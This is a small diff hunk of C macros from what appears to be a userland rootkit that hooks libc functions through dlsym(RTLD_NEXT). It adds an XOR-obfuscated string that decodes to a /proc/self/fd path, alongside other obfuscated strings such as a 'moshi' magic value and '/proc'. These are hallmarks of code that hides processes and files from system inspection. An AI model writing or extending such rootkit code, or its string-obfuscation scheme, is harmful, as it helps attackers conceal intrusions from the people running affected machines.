@@ -3,6 +3,7 @@
 #endif
 #define HOOK(func) old##_##func = dlsym(RTLD_NEXT, #func)
 #define CLEAN(var) clean(var, strlen(var))
+#define PROC_PATH "\x5\x5a\x58\x45\x49\x5\x59\x4f\x46\x4c\x5\x4c\x4e\x5\xf\x4e"
 #define LIBC "/lib/libc.so.6"
 #define MAGIC "\x47\x45\x59\x42\x43" // moshi
 #define PROC "\x5\x5a\x58\x45\x49"
